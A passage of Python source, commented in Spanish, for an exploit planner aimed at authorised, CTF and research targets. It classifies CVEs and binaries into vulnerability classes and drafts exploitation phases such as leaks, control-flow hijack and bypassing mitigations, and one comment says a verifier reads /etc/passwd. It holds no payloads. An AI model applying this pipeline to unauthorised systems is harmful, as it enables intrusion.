"""Planificador de explotacion (esquema) a partir de una CVE / clase de vulnerabilidad.

Objetivo: dado el texto o el id de una CVE (o una descripcion de la vulnerabilidad), y opcionalmente
los hechos de un binario cargado, producir un ESQUEMA de explotacion paso a paso: clase de la
vulnerabilidad -> primitiva que concede -> fases (fuga, control, gadgets, objetivo) -> mitigaciones a
sortear. Es "a la inversa": de la vulnerabilidad al exploit.

NO es un exploit generado a ciegas: es un plan tecnico y grounded. Si se pasa un binario, el plan se
concreta con sus mitigaciones (checksec) y con el Analizador de cadenas. El conocimiento de tecnicas
sale del RAG (ver kb: rop/heap/format-string/syscalls-seccomp/ctf-techniques). Solo para objetivos
AUTORIZADOS / CTF / research.
"""
from __future__ import annotations

import re
from dataclasses import dataclass, field
from typing import List, Optional


@dataclass
class Phase:
    name: str          # nombre de la fase
    goal: str          # que se consigue
    technique: str     # como (tecnica concreta)
    needs: str = ""    # que hace falta / precondicion


@dataclass
class ExploitPlan:
    vuln_class: str = ""
    cve: str = ""
    primitive: str = ""            # que primitiva concede la vuln
    phases: List[Phase] = field(default_factory=list)
    mitigations: List[str] = field(default_factory=list)   # a sortear (y como)
    kb_refs: List[str] = field(default_factory=list)       # cheat sheets del RAG relevantes
    note: str = ""
    # concrecion con un binario cargado (si se pasa)
    concrete: dict = field(default_factory=dict)   # {offset, gadgets, win, system, chain}
    verified: bool = False                          # exploit verificado por ejecucion en sandbox
    proof: dict = field(default_factory=dict)       # {strategy, offset, base, win, marker, output}
    script: str = ""                                # script pwntools reproducible (si hay verificado)

    @property
    def ok(self) -> bool:
        return bool(self.vuln_class)


# clase de vulnerabilidad -> (palabras clave, primitiva, refs kb)
_CLASSES = [
    ("stack-overflow", ("stack buffer overflow", "stack-based buffer overflow", "desbordamiento de pila",
                        "stack overflow", "gets(", "strcpy", "stack smashing"),
     "control de RIP (sobrescribe la direccion de retorno guardada)", ["ret2win", "rop", "ret2libc", "advanced-rop", "canary-bypass"]),
    ("heap-overflow", ("heap buffer overflow", "heap-based overflow", "desbordamiento de heap",
                       "heap overflow", "chunk overflow"),
     "corrupcion de metadatos de heap (pisa cabeceras/punteros de chunk adyacente)", ["heap", "modern-heap", "heap-grooming"]),
    ("uaf", ("use-after-free", "use after free", "uso despues de liberar", "dangling pointer"),
     "puntero colgante -> escritura/lectura en objeto liberado (tcache poisoning)", ["uaf-typeconfusion", "heap", "modern-heap"]),
    ("double-free", ("double free", "double-free", "doble liberacion"),
     "corrupcion de la tcache/fastbin -> arbitrary alloc", ["heap", "modern-heap"]),
    ("format-string", ("format string", "format-string", "cadena de formato", "uncontrolled format string",
                       "printf(", "%n"),
     "lectura y ESCRITURA arbitraria (%n) via argumentos de printf", ["format-string", "got-plt"]),
    ("oob-write", ("out-of-bounds write", "oob write", "escritura fuera de limites", "index out of bounds"),
     "escritura fuera de limites (write-what-where acotado)", ["mitigations", "got-plt"]),
    ("oob-read", ("out-of-bounds read", "oob read", "lectura fuera de limites", "over-read", "info leak"),
     "fuga de informacion (leak de punteros -> derrota ASLR)", ["mitigations", "ret2libc"]),
    ("type-confusion", ("type confusion", "confusion de tipos"),
     "confusion de tipos -> control de vtable/punteros de funcion", ["uaf-typeconfusion", "browser-v8"]),
    ("integer-overflow", ("integer overflow", "desbordamiento de entero", "integer underflow", "signedness"),
     "tamano/indice erroneo -> overflow o OOB secundario", ["integer-bugs"]),
    ("race-condition", ("race condition", "toctou", "time-of-check", "condicion de carrera", "double fetch"),
     "ventana de carrera -> estado inconsistente (p.ej. escalada/ficheros)", ["race-conditions"]),
    ("command-injection", ("command injection", "os command injection", "inyeccion de comandos",
                          "shell command", "shell metacharacter", "os command execution",
                          "command execution via"),
     "ejecucion de comandos del sistema con entrada no saneada", ["pentest-binarios"]),
    # --- clases WEB / aplicacion (no memoria nativa: el "exploit" es una peticion HTTP, no ROP) ---
    ("missing-authorization", ("missing authorization", "broken access control", "falta de autorizacion",
                               "sin verificar permisos", "missing authentication check"),
     "actua sobre un recurso/usuario ajeno sin que el servidor compruebe el permiso", ["pentest-binarios"]),
    ("idor", ("insecure direct object reference", "idor", "direct object reference"),
     "cambia un identificador referenciado directamente para alcanzar el recurso de otro usuario", []),
    ("auth-bypass", ("authentication bypass", "auth bypass", "bypass authentication",
                     "login bypass", "weak key", "zero key", "null key",
                     "weak encryption key", "predictable key", "hardcoded key",
                     "bypass 2fa", "2fa bypass", "two-factor bypass",
                     "remote password reset", "password reset bypass"),
     "evita por completo el paso de autenticacion", []),
    ("sqli", ("sql injection", "sqli", "inyeccion sql"),
     "inyeccion en una consulta SQL -> lectura/escritura/control sobre la base de datos", []),
    ("xss", ("cross-site scripting", "xss", "stored xss", "reflected xss", "dom-based xss"),
     "inyeccion de script en el contexto del navegador de la victima", []),
    ("ssrf", ("server-side request forgery", "ssrf"),
     "el servidor hace una peticion a una URL controlada por el atacante (red interna/metadata)", []),
    # ssti/path-traversal antes de rce: "server-side template injection (SSTI) and arbitrary code
    # execution" / "path traversal ... remote code execution" deben clasificarse por el mecanismo
    # especifico (causa raiz), no por el impacto generico (rce). CVE-2021-41773 confirma esto en
    # vivo: la descripcion menciona "path traversal" y "remote code execution" pero la causa raiz
    # es path traversal -- si rce ganara, _guess_package_lab no llega al httpd check.
    ("ssti", ("server-side template injection", "ssti", "template injection",
              "template engine", "templating engine"),
     "el motor de plantillas evalua entrada del atacante como codigo", []),
    ("path-traversal", ("path traversal", "directory traversal", "local file inclusion", "lfi"),
     "escapa del directorio esperado para leer/escribir ficheros arbitrarios", []),
    ("rce", ("remote code execution", "arbitrary code execution", "ejecucion remota de codigo"),
     "ejecucion de codigo arbitrario en el servidor", []),
    ("code-injection", ("code injection", "improper control of generation of code",
                        "php code injection", "php eval", "eval injection",
                        "arbitrary php", "arbitrary code", "code exec"),
     "el servidor evalua codigo proporcionado por el atacante (PHP eval, Python exec, etc.)", []),
    ("file-upload", ("unrestricted file upload", "arbitrary file upload", "file upload vulnerability"),
     "sube un fichero con extension/contenido no validado (p.ej. webshell)", []),
    ("deserialization", ("insecure deserialization", "unsafe deserialization", "object injection",
                         "deserializacion insegura"),
     "deserializa datos del atacante -> instancia objetos/gadget chain controlados", []),
    ("xxe", ("xml external entity", "xxe"),
     "procesa un DTD/entidad externa en XML -> lectura de fichero/SSRF", []),
    ("csrf", ("cross-site request forgery", "csrf"),
     "fuerza una accion autenticada desde un origen ajeno (sin interaccion directa con la sesion)", []),
    ("open-redirect", ("open redirect", "unvalidated redirect"),
     "redirige a una URL arbitraria controlada por el atacante (phishing/encadenable)", []),
    ("graphql-bypass", ("graphql", "graphql auth", "graphql bypass", "introspection bypass",
                        "unauthenticated graphql", "graphql authorization"),
     "acceso no autorizado a un endpoint GraphQL — omite controles de autenticacion en queries", []),
    ("boolean-oracle", ("boolean oracle", "data leak", "boolean injection", "blind data",
                        "where clause injection", "filter bypass", "boolean-based"),
     "exfiltra datos via diferencia TRUE/FALSE en respuestas (oracle booleano)", []),
    ("mass-assignment", ("mass assignment", "bulk assignment", "parameter pollution",
                         "unprotected parameters", "over-posting", "mass attribute"),
     "asigna atributos protegidos via JSON body (p.ej. role=admin)", []),
    ("account-takeover", ("account takeover", "account hijack", "unauthorized account",
                          "user account takeover", "admin account creation"),
     "toma control de cuenta ajena via bug en reset/registro/sesion", []),
    ("crlf-injection", ("crlf injection", "crlf", "http response splitting",
                        "header injection", "carriage return"),
     "inyecta CRLF en cabeceras HTTP para response splitting/cookie hijacking", []),
    ("2fa-bypass", ("two-factor authentication bypass", "2fa bypass", "otp bypass",
                    "mfa bypass", "totp bypass", "2-factor bypass"),
     "evita el segundo factor de autenticacion (OTP/TOTP)", []),
    ("session-fixation", ("session fixation", "session hijack", "session riding",
                          "token fixation"),
     "fija/hijack el ID de sesion antes del login para tomar control de la sesion", []),
    ("el-injection", ("el injection", "expression language injection", "spel", "ognl injection",
                      "thymeleaf injection", "freemarker injection", "velocity injection",
                      "jndi injection", "jndi", "expression injection", "template expression"),
     "el motor EL evalua una expresion del atacante como codigo (p.ej. SpEL/OGNL/Thymeleaf)", []),
    ("http-smuggling", ("http request smuggling", "request smuggling", "http smuggling",
                        "te.cl", "cl.te", "te.te", "desync attack", "http desync"),
     "dessincronizacion frontend/backend via ambiguedad Transfer-Encoding/Content-Length", []),
    ("zip-slip", ("zip slip", "archive traversal", "zip path traversal", "tar slip",
                  "archive extraction traversal"),
     "extrae un archivo con path relativo que sobreescribe ficheros fuera del destino", []),
]

# clases que NO son corrupcion de memoria nativa: el PoC es una peticion HTTP (o una pagina para CSRF/
# XSS), nunca un script pwntools contra un proceso local. Ver workflows/webexploit.py.
WEB_CLASSES = frozenset({
    "missing-authorization", "idor", "auth-bypass", "sqli", "xss", "stored-xss", "ssrf",
    "command-injection", "rce", "code-injection", "arbitrary-file-upload", "path-traversal",
    "lfi", "file-upload", "deserialization", "xxe", "ssti", "csrf", "open-redirect",
    "php-object-injection", "graphql-bypass", "boolean-oracle",
    # Mechanism-specific classes routed through web investigation + generic HTTP confirm
    "cli-argument-injection", "werkzeug-debug", "type-juggling", "insecure-randomness",
    "cors", "cors-misconfiguration", "cors-misconfig", "cors-reflection",
    # New classes added in architecture v2
    "jwt-bypass", "jwt", "jwt-weakness", "jwt-vulnerability", "jwt-none-algorithm",
    "jwt-weak-secret", "token-forgery", "authentication-bypass-via-jwt",
    "nosql-injection", "nosql", "mongodb-injection", "nosqli", "mongo-injection",
    "nosql-auth-bypass",
    "prototype-pollution", "proto-pollution", "proto-pollute",
    "race-condition", "toctou", "race", "time-of-check-time-of-use", "concurrent-request",
    "path-confusion", "middleware-bypass", "semicolon-bypass", "path-parameter-bypass",
    "path-override",
    "business-logic", "logic-flaw", "logic-bypass", "insufficient-validation",
    "workflow-bypass", "quota-bypass",
    "oauth-bypass", "oauth", "redirect-uri-bypass",
    "header-injection", "crlf-injection", "http-header-injection",
    "insecure-deserialization", "unsafe-deserialization", "object-injection",
    "pickle", "yaml-deserialization",
    "graphql-injection", "graphql-auth", "graphql", "graphql-authorization",
    "graphql-introspection",
    # Information disclosure / access control variants LLM may produce
    "information-disclosure", "sensitive-info-exposure", "sensitive-data-exposure",
    "data-exposure", "info-leak", "information-leak",
    "unauthorized-access", "unauthorized-modification", "unauthorized-read",
    "unauthorized-file-access", "broken-access-control", "improper-access-control",
    "insufficient-authorization", "privilege-escalation", "vertical-privilege-escalation",
    "horizontal-privilege-escalation",
    "arbitrary-file-read", "arbitrary-file-write", "arbitrary-file-deletion",
    "arbitrary-file-move", "file-read", "file-write", "file-delete",
    "object-deserialization", "php-deserialization", "java-deserialization",
    "account-takeover", "user-enumeration", "password-reset",
    "mass-assignment", "bulk-assignment", "over-posting", "mass-attribute-assignment",
    "http-response-splitting", "2fa-bypass", "mfa-bypass", "otp-bypass", "totp-bypass",
    "session-fixation", "session-hijacking", "token-fixation",
    "unvalidated-redirect",
    "xml-injection", "html-injection", "template-injection",
    "cache-poisoning", "web-cache-poisoning", "request-smuggling",
    "http-request-smuggling", "http-smuggling", "smuggling", "te-cl", "cl-te", "te-te",
    "el-injection", "el_injection", "expression-language-injection", "spel-injection",
    "ognl-injection", "thymeleaf-injection", "freemarker-injection", "velocity-injection",
    "jndi-injection",
    "zip-slip", "archive-traversal", "zip-path-traversal", "tar-slip",
    "clickjacking", "ui-redress",
    "cve-class-unknown", "unknown",  # allow web stage to run on unknown
})


def is_web_class(cls: str) -> bool:
    s = (cls or "").strip().lower().replace("_", "-")
    return s in WEB_CLASSES


def classify_cve(text: str) -> Optional[str]:
    t = (text or "").strip().lower()
    # atajo: si el texto ya es un id de clase canonico (lo que produce classify_binary), usalo tal cual
    if t in {c for c, _k, _p, _r in _CLASSES}:
        return t
    # atajo: slugs web conocidos que no pasan por _CLASSES (cors, etc.)
    if t in WEB_CLASSES:
        return t
    # FILE-UPLOAD ANTES que _CLASSES["rce"]: "arbitrary file uploads...may make RCE possible"
    # → el _CLASSES loop llega a "remote code execution" y devuelve "rce" sin alcanzar "file-upload".
    # La clave diagnostica es "file upload" (mecanismo) + indicador de falta de validación.
    if ("file upload" in t or "arbitrary file" in t) and (
            "missing" in t or "unrestricted" in t or "insufficient" in t or "lack" in t
            or "without" in t or "no validation" in t or "bypass" in t or "unauthenticated" in t
            or "extension" in t or "type validation" in t or "mime" in t):
        return "file-upload"
    # También captura "unauthenticated file upload" y "arbitrary file upload" sin modificador
    if "unauthenticated file upload" in t or "arbitrary file upload" in t:
        return "file-upload"
    # STORED-XSS ANTES que _CLASSES: "stored xss" y "xss" estan ambos en _CLASSES["xss"] →
    # "stored XSS via settings page" devolveria "xss" sin llegar a "stored-xss".
    if ("stored" in t or "persistent" in t) and ("xss" in t or "cross-site scripting" in t):
        return "stored-xss"
    # OPEN-REDIRECT ANTES que _CLASSES["xss"]: "open redirect AND xss" → _CLASSES["xss"] gana
    # porque xss (line 87) precede a open-redirect (line 116). La frase "open redirect" indica
    # el mecanismo primario; XSS es un efecto derivado (p.ej. CVE-2024-29041 Express.js).
    if "open redirect" in t or "unvalidated redirect" in t:
        return "open-redirect"
    # JWT-BYPASS ANTES que _CLASSES: "authentication bypass via JWT" → _CLASSES["auth-bypass"] gana.
    if "jwt" in t and ("bypass" in t or "none" in t or "algorithm" in t or "secret" in t or "forge" in t):
        return "jwt-bypass"
    # 2FA-BYPASS ANTES que _CLASSES["auth-bypass"]: "2FA/MFA/OTP bypass" → auth-bypass; pero el
    # verificador multistep requiere la clase especifica para activarse.
    if (("2fa" in t or "two-factor" in t or "two factor" in t or "mfa" in t
         or "otp" in t or "totp" in t or "one-time password" in t)
            and ("bypass" in t or "circumvent" in t or "skip" in t)):
        return "2fa-bypass"
    # NOSQL-INJECTION ANTES que _CLASSES: "NoSQL injection...authentication bypass" → auth-bypass.
    # EXCEPCION: "SQL injection...nosql operator" es sqli, no nosql. "nosql injection" contiene
    # "sql injection" como substring, asi que usamos \bsql\b para detectar SQL independiente.
    _is_standalone_sql = bool(re.search(r'\bsql\b', t)) and not re.search(r'\bnosql\b', t)
    if not _is_standalone_sql and ("nosql injection" in t or "nosql inject" in t or
            ("nosql" in t and "auth" in t) or ("mongodb" in t and "inject" in t)):
        return "nosql-injection"
    # PATH-TRAVERSAL ANTES que _CLASSES: descripciones que dicen "path traversal"/"traversal" pero
    # luego mencionan "code execution" como consecuencia → _CLASSES["code-injection"] puede ganar.
    # El mecanismo es path traversal; el verificador leera /etc/passwd, no inyectara codigo.
    # EXCEPCION: CVEs compuestos con command-injection o RCE como vulnerabilidad primaria se
    # dejan pasar al loop _CLASSES para que el mecanismo mas grave gane.
    # EXCEPCION IDOR: "IDOR via... path-traversal string" → idor es la clase primaria; el
    # patron "traversal" en la descripcion describe la TECNICA, no la clase. Se deja pasar a
    # _CLASSES["idor"] para que "idor" en el texto gane.
    _no_command = not ("shell" in t or "subprocess" in t or "metachar" in t or
                       "command injection" in t or "os command" in t)
    _no_ssti = not ("template" in t and ("inject" in t or "render" in t or "jinja" in t or
                                          "twig" in t or "smarty" in t))
    _no_idor = "idor" not in t and "insecure direct object" not in t
    if _no_command and _no_ssti and _no_idor and (
            "path traversal" in t or "directory traversal" in t or
            ("traversal" in t and ("file" in t or "read" in t or "pathname" in t))) and (
            "read" in t or "access" in t or "file" in t):
        return "path-traversal"
    # LFI ANTES que _CLASSES: "including arbitrary files in PHP's execution context" llega
    # como "leads to RCE" y seria clasificado como rce si lo dejamos pasar al loop normal.
    # El mecanismo (file inclusion) importa mas que la consecuencia (rce) para el verificador.
    # CUIDADO: "file upload...may make remote code execution possible" NO es LFI; "execution"
    # como consecuencia secundaria no cuenta. Requerimos "execution context" o "php context"
    # para el patron primario de LFI, no solo "execution" flotante.
    _incl = "includ" in t or "inclus" in t  # includes/including/inclusion
    if _incl and "file" in t and (
            "file inclus" in t or
            ("inclus" in t and "php" in t) or  # "inclusion of PHP files" / "PHP file inclusion"
            ("arbitrary" in t and
             ("execution context" in t or "php context" in t or
              ("context" in t and "php" in t))) or
            ("local" in t and ("path" in t or "php" in t))):
        return "lfi"
    # DESERIALIZATION ANTES que _CLASSES["rce"]: "RCE via unsafe deserialization" llega al loop
    # con "remote code execution" que esta en _CLASSES["rce"] y gana antes que "deserialization".
    # El mecanismo (deserialización) importa más que la consecuencia (rce) para el verificador.
    # Negaciones ("does not deserialize", "without deserialization") deben NO activar este bloque.
    _dser_neg = ("not deserializ" in t or "without deserializ" in t or
                 "prevent deserializ" in t or "fix deserializ" in t or
                 "not unserializ" in t or "without unserializ" in t)
    if not _dser_neg and ("deserializ" in t or "unserializ" in t or "object injection" in t):
        return "deserialization"
    # EL-INJECTION ANTES que _CLASSES["ssti"]: "SpEL injection", "Thymeleaf template injection",
    # "OGNL injection", "FreeMarker injection", "Velocity injection", "JNDI injection" se
    # clasificarian como "ssti" porque "template inject" aparece en los keywords de SSTI.
    # El verificador EL usa arithmetic canary + notaciones especificas (SpEL/OGNL/Thymeleaf);
    # clasificar como "ssti" manda al verificador SSTI generico que no prueba esas notaciones.
    _el_specific = (
        "spel" in t or "spring expression" in t or
        "ognl" in t or "struts" in t and "inject" in t or
        "thymeleaf" in t and ("inject" in t or "template" in t) or
        "freemarker" in t and "inject" in t or
        "velocity" in t and "inject" in t or
        "jndi" in t and ("inject" in t or "lookup" in t) or
        ("expression language" in t and "inject" in t) or
        "el injection" in t
    )
    if _el_specific:
        return "el-injection"
    # ZIP-SLIP ANTES que _CLASSES["path-traversal"]: "zip slip" o "archive traversal" se
    # clasificarian como "path-traversal" sin activar el verificador especifico de zip-slip.
    if "zip slip" in t or "zip-slip" in t or ("archive" in t and "traversal" in t) or "tar slip" in t:
        return "zip-slip"
    # HTTP-SMUGGLING ANTES que _CLASSES para evitar clasificacion como "xss" o "sqli".
    if ("smuggling" in t and ("http" in t or "request" in t)) or "desync attack" in t or \
       ("te.cl" in t or "cl.te" in t or "te.te" in t):
        return "http-smuggling"
    for cls, kws, _prim, _refs in _CLASSES:
        if any(k in t for k in kws):
            return cls
    # respaldo por co-ocurrencia: descripciones de CVE varian en la redaccion exacta (p.ej.
    # "heap-based buffer overflow"), asi que si no hubo match literal, deducimos por terminos juntos.
    def has(*ws):
        return all(w in t for w in ws)
    if has("heap", "overflow") or has("heap", "buffer"):
        return "heap-overflow"
    if has("stack", "overflow") or has("stack", "buffer") or "buffer overflow" in t:
        return "stack-overflow"
    if has("use", "after", "free") or "use-after-free" in t:
        return "uaf"
    if has("uncontrolled", "format", "string") or has("format", "string", "printf") or \
            "%n" in t or "printf(" in t:
        return "format-string"
    if has("out-of-bounds", "write") or has("out of bounds", "write"):
        return "oob-write"
    if has("out-of-bounds", "read") or has("out of bounds", "read"):
        return "oob-read"
    if has("integer", "overflow") or has("integer", "underflow"):
        return "integer-overflow"
    if has("type", "confusion"):
        return "type-confusion"
    if has("command", "injection") or has("os", "command"):
        return "command-injection"
    # --- clases web/app (respaldo por co-ocurrencia; la redaccion varia mucho entre CVEs) ---
    if has("missing", "authorization") or has("broken", "access", "control") or \
       has("missing", "capability") or has("capability", "check") or \
       (has("without", "verifying") and "permission" in t) or \
       (has("sin", "verificar") and ("permiso" in t or "autoriza" in t)):
        return "missing-authorization"
    if has("insecure", "direct", "object") or has("idor"):
        return "idor"
    # JWT/NoSQL ANTES que auth-bypass: "authentication bypass via JWT" / "NoSQL injection...auth bypass"
    # tendrian como resultado "auth-bypass" sin estas comprobaciones previas mas especificas.
    if "jwt" in t and ("bypass" in t or "none" in t or "algorithm" in t or "secret" in t):
        return "jwt-bypass"
    if ("nosql" in t or "mongodb" in t or "mongo" in t) and \
            ("injection" in t or "inject" in t or "auth" in t):
        return "nosql-injection"
    if has("authentication", "bypass") or has("auth", "bypass"):
        return "auth-bypass"
    if ("oauth" in t and ("forge" in t or "bypass" in t or "tamper" in t or "token" in t or
                          "redirect_uri" in t or "redirect" in t)) or \
            has("oauth2", "bypass") or has("oidc", "bypass"):
        return "oauth-bypass"
    if has("sql", "injection") or "sqli" in t:
        return "sqli"
    if has("cross-site", "scripting") or re.search(r"\bxss\b", t):
        return "xss"
    if ("cors" in t and ("misconfigur" in t or "bypass" in t or "origin" in t or "header" in t)) or \
            ("access-control-allow-origin" in t and
             ("access-control-allow-credentials" in t or "reflect" in t or "arbitrary" in t or
              "without" in t or "allowlist" in t or "whitelist" in t)):
        return "cors-misconfiguration"
    if has("server-side", "request", "forgery") or re.search(r"\bssrf\b", t):
        return "ssrf"
    # LFI check ANTES que RCE: "including arbitrary files in PHP's execution context" = LFI aunque
    # lleve a RCE. El mecanismo es LFI; el verificador de LFI puede confirmar AMBAS cosas.
    if has("local", "file", "inclus") or re.search(r"\blfi\b", t):
        return "lfi"
    if (has("includ", "arbitrary", "file") and
            ("context" in t or "php" in t or "execution" in t)):
        return "lfi"
    if has("remote", "code", "execution") or re.search(r"\brce\b", t):
        return "rce"
    if has("execute", "code") or has("code", "execution"):
        return "rce"
    if has("path", "traversal") or has("directory", "traversal"):
        return "path-traversal"
    if has("file", "upload") and ("unrestricted" in t or "arbitrary" in t or "insufficient" in t):
        return "file-upload"
    if "deserializ" in t and ("insecure" in t or "unsafe" in t or "unauthenticated" in t):
        return "deserialization"
    if "xxe" in t or has("xml", "external", "entity"):
        return "xxe"
    if has("template", "injection") or re.search(r"\bssti\b", t):
        return "ssti"
    if has("cross-site", "request", "forgery") or re.search(r"\bcsrf\b", t):
        return "csrf"
    if (has("open", "redirect") or has("url", "redirect") or has("redirect", "url") or
            ("redirect" in t and ("domain" in t or "attacker" in t or "arbitrary" in t)) or
            has("unvalidated", "redirect")):
        return "open-redirect"
    # --- arbitrary file read / write (ANTES de information-disclosure) ---
    # Si una descripcion dice "arbitrary file read...which can contain sensitive information",
    # has("sensitive","file") la clasifica como info-disclosure: incorrecto. El mecanismo
    # (file read vía path traversal) es lo que importa para el verificador.
    if (has("arbitrary", "file", "read") or has("arbitrary", "file", "download") or
            (has("read", "arbitrary") and "file" in t)):
        return "path-traversal"
    if has("arbitrary", "file", "write") or has("arbitrary", "file", "upload"):
        return "file-upload"
    # --- information-disclosure / data exposure ---
    # Cache-proxy leaking session cookies entre usuarios = information-disclosure.
    if (has("session", "cookie") and ("proxy" in t or "cache" in t)) or \
            (has("cache", "poison") or has("web", "cache", "deception")):
        return "information-disclosure"
    if (has("sensitive", "information", "exposure") or has("sensitive", "data", "exposure") or
            has("information", "disclosure") or has("information", "exposure") or
            has("data", "exposure") or
            has("hardcoded", "api", "key") or has("hardcoded", "credential") or
            has("api", "key", "exposed") or has("credentials", "exposed") or
            has("sensitive", "file") or has("info", "leak") or
            has("enumerat", "user") or has("enumerate", "email") or
            has("enumerate", "address") or
            "directory listing" in t or "reflected file download" in t or
            has("verbose", "error") or has("error", "message", "exposure")):
        return "information-disclosure"
    # --- unauthorized access / privilege escalation ---
    if (has("unauthorized", "access") or has("unauthorized", "modification") or
            has("unauthorized", "read") or has("unauthorized", "file") or
            has("privilege", "escalation") or has("improper", "access", "control") or
            has("insufficient", "authorization") or has("improper", "authorization") or
            has("escalate", "admin") or has("escalate", "role") or
            ("escalate" in t and "privilege" in t) or
            ("role" in t and ("bypass" in t or "escalat" in t)) or
            has("broken", "authentication")):
        return "missing-authorization"
    if has("prototype", "pollution") or has("proto", "pollution"):
        return "prototype-pollution"
    if has("race", "condition") or re.search(r"\btoctou\b", t):
        return "race-condition"
    if "nosql" in t or ("mongodb" in t and "inject" in t):
        return "nosql-injection"
    return None


_FMT_FUNCS = ("printf", "fprintf", "sprintf", "snprintf", "vprintf", "vsprintf", "syslog")


_INSN_RE = re.compile(r"\b(lea|mov|movabs|movzx|movsxd|xor)\s+(e?[a-z]{2}|r[a-z0-9]+)\s*,\s*([^;]+)")
_REG64 = {"eax": "rax", "ebx": "rbx", "ecx": "rcx", "edx": "rdx", "esi": "rsi",
          "edi": "rdi", "ebp": "rbp", "esp": "rsp"}


def _norm_r(r: str) -> str:
    r = r.strip().lower()
    return _REG64.get(r, r)


def _src_is_const(mnem: str, src: str) -> Optional[bool]:
    """Clasifica una FUENTE como constante (True), variable (False) o 'sigue el registro' (None)."""
    src = src.strip().lower()
    if mnem == "lea":
        # lea reg, [rip + str.x] / [rip + 0x..] -> puntero a rodata = constante;
        # lea reg, [var_..] / [rbp/rsp ...] -> direccion de un local = variable
        if "var_" in src or "rbp" in src or "rsp" in src:
            return False
        return True                                  # rip-relativo a rodata
    # mov / movabs / movzx / movsxd
    if "str." in src or "obj." in src:
        return True
    if re.fullmatch(r"0x[0-9a-f]+", src):
        return True                                  # immediato = puntero a literal
    if re.fullmatch(r"e?[a-z]{2}|r[a-z0-9]+", src):
        return None                                  # otro registro: hay que seguirlo
    if "var_" in src or "[" in src:
        return False                                 # cargado de memoria/local
    return True


def _fmt_arg_is_variable(disasm_func: str, call_line_idx: int, lines: list, func: str) -> bool:
    """En una llamada a printf-family, resuelve el ORIGEN del registro de FORMATO siguiendo la cadena
    de escrituras (incluidos los `mov rdi, rax` con `lea rax,[rip+str]` de los binarios PIE). Decide:
    constante (rodata/immediato/`str.`) -> seguro; local (`lea reg,[var]`) o memoria -> format-string."""
    target = _norm_r("rsi" if func in ("fprintf", "syslog") else "rdi")   # System V
    hops = 0
    j = call_line_idx - 1
    while j >= 0 and hops < 12:
        ln = lines[j]
        if "call " in ln.lower():          # el argumento ya estaba fijado antes de otra llamada
            break
        m = _INSN_RE.search(ln)
        if not m:
            j -= 1
            continue
        mnem, dst, src = m.group(1).lower(), _norm_r(m.group(2)), m.group(3).strip().lower()
        if dst != target:                  # no escribe el registro que seguimos
            j -= 1
            continue
        verdict = _src_is_const(mnem, src)
        if verdict is True:
            return False                   # constante -> printf seguro
        if verdict is False:
            return True                    # variable/local -> format-string
        # verdict None: la fuente es otro registro; seguimos ESE registro hacia atras
        target = _norm_r(src)
        hops += 1
        j -= 1
    return False


def classify_binary(binary: str, reg=None) -> Optional[str]:
    """Clasifica la clase de vulnerabilidad DOMINANTE por el binario (estatico, best-effort):
    format-string (printf con formato no constante) > heap/uaf (malloc+free con superficie UAF) >
    stack-overflow (gets/strcpy o control de RIP). Devuelve la clase o None si no es concluyente.
    Prioriza la senal mas especifica; no pretende ser exhaustivo (oob-write/integer se quedan None)."""
    try:
        if reg is None:
            from ..oracles import build_registry
            reg = build_registry(binary)
        from ._binfacts import imported_names
        names = imported_names(reg)
        sinks = (reg.get("r2_sinks").run().data or "") if reg.get("r2_sinks") else ""
        heap = (reg.get("r2_heap").run().data or "") if reg.get("r2_heap") else ""
    except Exception:
        return None
    # 1) format-string: alguna llamada a printf-family con el formato tomado de una variable
    fmt_funcs_present = [f for f in _FMT_FUNCS if f in names]
    if fmt_funcs_present:
        # funciones que alcanzan un sink printf-family (de r2_sinks)
        callers = set()
        cur = None
        for ln in sinks.splitlines():
            s = ln.strip()
            m = re.match(r"### sink:\s*(\w+)", s)
            if m:
                cur = m.group(1)
                continue
            if cur in _FMT_FUNCS and "call sym.imp." in s:
                fn = s.split()[0]
                callers.add(fn)
        for fn in callers:
            try:
                dz = reg.get("r2_disasm").run(target=fn).data or ""
            except Exception:
                continue
            lines = dz.splitlines()
            for i, ln in enumerate(lines):
                mm = re.search(r"call sym\.imp\.(\w+)", ln)
                if mm and mm.group(1) in _FMT_FUNCS:
                    if _fmt_arg_is_variable(dz, i, lines, mm.group(1)):
                        return "format-string"
    # 2) heap: superficie de UAF/double-free (malloc + free en la misma funcion, puntero colgante).
    # Nombres de import EXACTOS (imported_names), no substring sobre el texto crudo de `ii`: "free"
    # como substring hacia match dentro de "freeaddrinfo" (getaddrinfo/red, nada que ver con el
    # free() de memoria), clasificando binarios sin ningun bug de heap como 'uaf'.
    if ("malloc" in names or "calloc" in names) and "free" in names:
        if "uaf surface" in heap.lower() or "use-after-free" in heap.lower() or "double" in heap.lower():
            return "uaf"
        if "alloc=" in heap.lower():
            return "heap-overflow"
    # 3) stack-overflow: sinks de copia insegura clasicos. Mismo motivo: "gets" como substring
    # matcheaba "getsockopt"/similar.
    if any(s in names for s in ("gets", "strcpy", "strcat", "sprintf")):
        return "stack-overflow"
    # sin senal concluyente: que decida el analizador de cadenas (control de RIP) aguas arriba
    return None


def _mem_phases(cls: str, facts: dict, es: bool) -> List[Phase]:
    """Fases para corrupcion de memoria, concretadas con las mitigaciones del binario si se dan."""
    pie = facts.get("pie") is True
    nx = facts.get("nx") is not False
    canary = facts.get("canary") is True
    P = []
    if canary:
        P.append(Phase(
            "Fuga del canary" if es else "Canary leak",
            "obtener el valor del stack canary" if es else "obtain the stack canary",
            "leak por OOB-read / format-string / fuga parcial; sin fuga, el overflow lineal se detecta"
            if es else "leak via OOB-read / format-string / partial disclosure; without it the linear "
            "overflow is caught",
            "una primitiva de lectura o un %x/%s controlado" if es else "a read primitive or a controlled %x/%s"))
    if pie:
        P.append(Phase(
            "Fuga de dirreccion (derrotar PIE/ASLR)" if es else "Address leak (defeat PIE/ASLR)",
            "resolver la base del binario/libc" if es else "resolve the binary/libc base",
            "leak de un puntero conocido (GOT/retorno/environ) para rebasar" if es else
            "leak a known pointer (GOT/return/environ) to rebase",
            "un leak (OOB-read, format-string, puts(GOT))" if es else "a leak (OOB-read, format-string, puts(GOT))"))
    P.append(Phase(
        "Control del flujo" if es else "Control-flow hijack",
        "controlar RIP (o un puntero de funcion/vtable)" if es else "control RIP (or a function pointer/vtable)",
        ("sobrescribir la direccion de retorno guardada tras el offset" if cls == "stack-overflow" else
         "envenenar tcache/fastbin o pisar un puntero de funcion") if es else
        ("overwrite the saved return address past the offset" if cls == "stack-overflow" else
         "poison tcache/fastbin or clobber a function pointer"),
        "el offset a RIP (o el layout del heap)" if es else "the offset to RIP (or the heap layout)"))
    if nx:
        P.append(Phase(
